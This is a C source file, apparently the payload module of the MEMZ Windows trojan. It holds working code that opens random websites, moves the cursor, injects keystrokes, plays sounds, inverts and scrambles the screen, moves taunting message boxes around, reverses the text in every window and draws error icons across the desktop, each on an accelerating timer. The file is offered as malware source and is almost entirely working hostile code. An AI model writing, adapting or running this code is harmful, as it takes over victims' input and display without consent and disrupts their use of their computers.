#include "MEMZ.h"

PAYLOAD payloads[] = {
	{ payloadExecute, 30000 },
	{ payloadCursor, 30000 },
	{ payloadKeyboard, 20000 },
	{ payloadSound, 50000 },
	{ payloadBlink, 30000 },
	{ payloadMessageBox, 20000 },
	{ payloadDrawErrors, 10000 },
	{ payloadChangeText, 40000 },
	{ payloadPIP, 60000 },
	{ payloadPuzzle, 15000 }
};

const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
BOOLEAN enablePayloads = TRUE;

DWORD
WINAPI
payloadThread(
	LPVOID parameter
)
{
	INT delay = 0;
	INT times = 0;
	INT runtime = 0;

	PAYLOAD* payload = (PAYLOAD*)parameter;

	for (;;)
	{
		if (delay-- == 0)
		{
			delay = (payload->payloadFunction)(times++, runtime);
		}

		runtime++;
		Sleep(10);
	}
}

INT 
payloadExecute(PAYLOADFUNC)
{
	PAYLOADHEAD

		ShellExecuteA(0, "open", (LPCSTR)sites[rand() % nSites], 0, 0, SW_SHOWDEFAULT);

out: return 1500.0 / (times / 15.0 + 1) + 100 + (rand() % 200);
}

INT payloadBlink(PAYLOADFUNC) {
	PAYLOADHEAD

		HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
	ReleaseDC(hwnd, hdc);

out: return 100;
}

INT payloadCursor(PAYLOADFUNC) {
	PAYLOADHEAD

		POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)));

out: return 2;
}

INT payloadMessageBox(PAYLOADFUNC) {
	PAYLOADHEAD

		CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);

out: return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
}

DWORD WINAPI messageBoxThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}

LRESULT CALLBACK msgBoxHook(INT nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			INT x = random() % (scrw - pcs->cx);
			INT y = random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

INT payloadChangeText(PAYLOADFUNC) {
	PAYLOADHEAD
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

out: return 50;
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		strReverseW(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}

	GlobalFree(str);

	return TRUE;
}

INT payloadSound(PAYLOADFUNC) {
	PAYLOADHEAD

		// There seems to be a bug where toggling ALL payloads kills the sound output on some systems.
		// I don't know why this happens, but using SND_SYNC seems to fix the bug.
		// But the sound is not not as fast as before. I hope there is another way to fix it without slowing down the payload.
		// As this only happens for the enable-disable part, I will only include that in the clean build as a workaround.
#ifdef CLEAN
		PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_SYNC);
out: return random() % 10;
#else
		PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
out: return 20 + (random() % 20);
#endif
}

INT payloadPuzzle(PAYLOADFUNC) {
	PAYLOADHEAD

		HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);

	INT x1 = random() % (rekt.right - 100);
	INT y1 = random() % (rekt.bottom - 100);
	INT x2 = random() % (rekt.right - 100);
	INT y2 = random() % (rekt.bottom - 100);
	INT width = random() % 600;
	INT height = random() % 600;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
	ReleaseDC(hwnd, hdc);

out: return 200.0 / (times / 5.0 + 1) + 3;
}

INT
payloadKeyboard(PAYLOADFUNC) {
	PAYLOADHEAD

		INPUT input;

	input.type = INPUT_KEYBOARD;
	input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &input, sizeof(INPUT));

out: return 300 + (random() % 400);
}

INT payloadPIP(PAYLOADFUNC) {
	PAYLOADHEAD

		HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
	ReleaseDC(hwnd, hdc);

out: return 200.0 / (times / 5.0 + 1) + 4;
}

INT payloadDrawErrors(PAYLOADFUNC) {
	PAYLOADHEAD

		INT ix = GetSystemMetrics(SM_CXICON) / 2;
	INT iy = GetSystemMetrics(SM_CYICON) / 2;

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);

	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	if (random() % (INT)(10 / (times / 500.0 + 1) + 1) == 0) {
		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_WARNING));
	}

	ReleaseDC(hwnd, hdc);

out: return 2;
}
